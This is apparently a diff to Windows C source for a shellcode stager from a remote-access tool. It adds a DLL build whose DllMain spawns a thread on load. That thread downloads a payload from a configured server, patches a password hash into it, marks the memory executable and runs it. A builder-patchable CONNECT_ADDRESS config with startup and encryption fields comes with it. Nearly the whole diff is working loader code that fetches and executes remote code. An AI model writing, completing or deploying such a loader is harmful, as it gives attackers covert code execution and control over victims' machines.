@@ -3,6 +3,8 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <time.h>
+#include <assert.h>
+#include <stdbool.h>
 
 #ifdef _DEBUG
 #include <stdio.h>
@@ -165,26 +167,90 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut) {
 	return NULL;
 }
 
+inline int MemoryFind(const char* szBuffer, const char* Key, int iBufferSize, int iKeySize)
+{
+	for (int i = 0; i < iBufferSize - iKeySize; ++i){
+		if (0 == memcmp(szBuffer + i, Key, iKeySize)){
+			return i;
+		}
+	}
+	return -1;
+}
+
 struct CONNECT_ADDRESS
 {
 	char	        szFlag[32];
 	char			szServerIP[100];
 	char			szPort[8];
-	char			szReserved[160];
+	int				iType;
+	bool            bEncrypt;
+	char            szBuildDate[12];
+	int             iMultiOpen;
+	int				iStartup;
+	int				iHeaderEnc;
+	char            szReserved[62];
+	char			pwdHash[64];
 }g_Server = { "Hello, World!", "127.0.0.1", "6543" };
 
-int main() {
+typedef struct PluginParam {
+	char IP[100];
+	int Port;
+	void* Exit;
+	void* User;
+}PluginParam;
+
+#ifdef _WINDLL
+#define DLL_API __declspec(dllexport)
+#else 
+#define DLL_API
+#endif
+
+extern DLL_API DWORD WINAPI run(LPVOID param) {
+	PluginParam* info = (PluginParam*)param;
 	int size = 0;
-	const char* dllData = ReceiveShellcode(g_Server.szServerIP, atoi(g_Server.szPort), &size);
+	const char* dllData = ReceiveShellcode(info->IP, info->Port, &size);
 	if (dllData == NULL) return -1;
 	void* execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (NULL == execMem) return -2;
+	char find[] = "61f04dd637a74ee34493fc1025de2c131022536da751c29e3ff4e9024d8eec43";
+	int offset = MemoryFind(dllData, find, size, sizeof(find)-1);
+	if (offset != -1) {
+		memcpy(dllData + offset, info->User, 64);
+	}
 	memcpy(execMem, dllData + 22, size);
 	free((void*)dllData);
 	DWORD oldProtect = 0;
 	if (!VirtualProtect(execMem, size, PAGE_EXECUTE_READ, &oldProtect)) return -3;
 
 	((void(*)())execMem)();
-	Sleep(INFINITE);
 	return 0;
 }
+
+#ifndef _WINDLL
+
+int main() {
+	assert(sizeof(struct CONNECT_ADDRESS) == 300);
+	PluginParam param = { 0 };
+	strcpy(param.IP, g_Server.szServerIP);
+	param.Port = atoi(g_Server.szPort);
+	param.User = g_Server.pwdHash;
+	DWORD result = run(&param);
+	Sleep(INFINITE);
+	return result;
+}
+
+#else
+
+BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+{
+	if (fdwReason == DLL_PROCESS_ATTACH){
+		static PluginParam param = { 0 };
+		strcpy(param.IP, g_Server.szServerIP);
+		param.Port = atoi(g_Server.szPort);
+		param.User = g_Server.pwdHash;
+		CloseHandle(CreateThread(NULL, 0, run, &param, 0, NULL));
+	}
+	return TRUE;
+}
+
+#endif
